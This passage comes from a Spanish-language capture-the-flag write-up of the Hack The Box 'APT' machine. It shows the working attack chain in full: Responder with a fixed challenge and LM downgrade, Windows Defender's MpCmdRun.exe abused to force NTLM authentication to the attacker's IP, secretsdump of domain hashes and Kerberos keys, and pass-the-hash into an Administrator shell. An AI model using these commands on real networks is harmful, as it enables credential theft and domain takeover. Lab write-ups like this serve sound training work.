      ServerRequireSigning    : True
      ServerNegotiateSigning  : True
      LdapSigning             : Negotiate signing (Negotiate signing)

  Session Security
      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
        [!] NTLM clients support NTLMv1!
      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)

        [!] NTLM services on this machine support NTLMv1!

  NTLM Auditing and Restrictions
      InboundRestrictions     :  (Not defined)
      OutboundRestrictions    :  (Not defined)
      InboundAuditing         :  (Not defined)
      OutboundExceptions      :
```

- Algo que podemos hacer es robar el hash **NTLMv1** con el `responder` <https://crack.sh/netntlm/>.

- Primeramente necesitamos especificar el **challenge** en el archivo `/usr/share/responder/Responder.conf`.

```bash
; Custom challenge.
; Use "Random" for generating a random challenge for each requests (Default)
#Challenge = Random
Challenge = 1122334455667788
; SQLite Database file
; Delete this file to re-capture previously captured hashes
Database = Responder.db
```

- Ahora desplegamos el `responder`.

```bash
➜  content sudo responder -I tun0 --lm
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [ON]
    Force ESS downgrade        [ON]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.222]
    Responder IPv6             [dead:beef:2::10dc]
    Challenge set              [1122334455667788]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-X53SCZ99DLB]
    Responder Domain Name      [GU17.LOCAL]
    Responder DCE-RPC Port     [47394]

[+] Listening for events...
```

- Algo que podemos hacer para hacer la autenticación como el `defender` esta habilitado podemos hacer que haga un escaneo de un recurso compartido a nivel de red atreves del `MpCmdRun.exe`.

```bash
*Evil-WinRM* PS C:\Program Files\Windows Defender> dir


    Directory: C:\Program Files\Windows Defender


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/21/2016   1:53 AM                en-US
d-----        9/24/2020   9:15 AM                platform
-a----        7/16/2016   2:12 PM           9398 AmMonitoringInstall.mof
-a----         1/7/2021  10:55 PM         188928 AMMonitoringProvider.dll
-a----        7/16/2016   2:12 PM          21004 AmStatusInstall.mof
-a----        7/16/2016   2:12 PM           2460 ClientWMIInstall.mof
-a----         1/7/2021  10:55 PM         306176 ConfigSecurityPolicy.exe
-a----        3/28/2017   6:23 AM         224256 DataLayer.dll
-a----        7/16/2016   2:12 PM        1514688 DbgHelp.dll
-a----        7/16/2016   2:12 PM         724480 EppManifest.dll
-a----        7/16/2016   2:12 PM            361 FepUnregister.mof
-a----         3/4/2021   5:03 AM          86528 MpAsDesc.dll
-a----         1/7/2021  10:39 PM        2630656 MpAzSubmit.dll
-a----         3/4/2021   4:55 AM         928768 MpClient.dll
-a----         3/4/2021   5:42 AM         377648 MpCmdRun.exe
-a----         3/4/2021   4:58 AM         335360 MpCommu.dll
-a----        7/16/2016   2:12 PM         113152 MpEvMsg.dll
-a----         3/4/2021   5:01 AM         101888 MpOAV.dll
-a----         1/7/2021  10:55 PM         178176 MpProvider.dll
-a----         3/4/2021   4:57 AM         526336 MpRtp.dll
-a----         3/4/2021   4:55 AM        2000384 MpSvc.dll
-a----         3/4/2021   5:02 AM          76288 MsMpCom.dll
-a----         3/4/2021   5:42 AM          97184 MsMpEng.exe
-a----         3/4/2021   5:05 AM           4608 MsMpLics.dll
-a----         3/4/2021   5:03 AM          53248 NisLog.dll
-a----         3/4/2021   5:48 AM         339400 NisSrv.exe
-a----         3/4/2021   5:03 AM          66048 NisWfp.dll
-a----        4/28/2017  12:52 AM         551424 ProtectionManagement.dll
-a----        7/16/2016   2:12 PM          57424 ProtectionManagement.mof
-a----        7/16/2016   2:12 PM           2570 ProtectionManagement_Uninstall.mof
-a----        7/16/2016   2:12 PM         156864 SymSrv.dll
-a----        7/16/2016   2:12 PM              1 SymSrv.yes
-a----        7/16/2016   2:12 PM           1091 ThirdPartyNotices.txt


*Evil-WinRM* PS C:\Program Files\Windows Defender>
```

- Con esto vamos a escanear un archivo de un recurso compartido a nivel de red de nosotros que no es obligatorio que exista solo es para hacer la autenticación y robar el `hash`.

```bash
*Evil-WinRM* PS C:\Program Files\Windows Defender> .\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.14.222\yo
```

- Nos llega el hash.

```bash
➜  content sudo responder -I tun0 --lm
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [ON]
    Force ESS downgrade        [ON]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.222]
    Responder IPv6             [dead:beef:2::10dc]
    Challenge set              [1122334455667788]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-X53SCZ99DLB]
    Responder Domain Name      [GU17.LOCAL]
    Responder DCE-RPC Port     [47394]

[+] Listening for events...

[SMB] NTLMv1 Client   : 10.129.96.60
[SMB] NTLMv1 Username : HTB\APT$
[SMB] NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788
[*] Skipping previously captured hash for HTB\APT$
[*] Skipping previously captured hash for HTB\APT$
```

- Podríamos usar esta web para crackear el hash pero esta en mantenimiento <https://crack.sh/get-cracking/> y como no esta operativa no podemos crackear el hash así que yo le pedí a mi compañero que en su momento hiso la maquina que me pasara el hash por que la pagina web estaba operativa cuando el la hiso.

- Con el hash podemos `dumpear` todos los hashes de los usuarios.

```bash
➜  content impacket-secretsdump 'htb.local/APT$@apt' -hashes :d167c3238864b12f5f82feae86a7f798
Impacket v0.11.0 - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::
henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::
APT$:1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72f9fc8f3cd23768be8d37876d459ef09ab591a729924898e5d9b3c14db057e3
Administrator:aes128-cts-hmac-sha1-96:a3b0c1332eee9a89a2aada1bf8fd9413
Administrator:des-cbc-md5:0816d9d052239b8a
krbtgt:aes256-cts-hmac-sha1-96:b63635342a6d3dce76fcbca203f92da46be6cdd99c67eb233d0aaaaaa40914bb
krbtgt:aes128-cts-hmac-sha1-96:7735d98abc187848119416e08936799b
krbtgt:des-cbc-md5:f8c26238c2d976bf
henry.vinson:aes256-cts-hmac-sha1-96:63b23a7fd3df2f0add1e62ef85ea4c6c8dc79bb8d6a430ab3a1ef6994d1a99e2
henry.vinson:aes128-cts-hmac-sha1-96:0a55e9f5b1f7f28aef9b7792124af9af
henry.vinson:des-cbc-md5:73b6f71cae264fad
henry.vinson_adm:aes256-cts-hmac-sha1-96:f2299c6484e5af8e8c81777eaece865d54a499a2446ba2792c1089407425c3f4
henry.vinson_adm:aes128-cts-hmac-sha1-96:3d70c66c8a8635bdf70edf2f6062165b
henry.vinson_adm:des-cbc-md5:5df8682c8c07a179
APT$:aes256-cts-hmac-sha1-96:4c318c89595e1e3f2c608f3df56a091ecedc220be7b263f7269c412325930454
APT$:aes128-cts-hmac-sha1-96:bf1c1795c63ab278384f2ee1169872d9
APT$:des-cbc-md5:76c45245f104a4bf
[*] Cleaning up...
```

## Shell as Administrator

- Ahora teniendo el hash del usuario administrador podemos conectarnos con `evil-wirnm` y obtener la ultima flag.

```bash
➜  content evil-winrm -i apt -u 'Administrator' -H 'c370bddf384a691d811ff3495e8a72e2'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
c52c0f60732da145b5ca1d4da4a65287
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
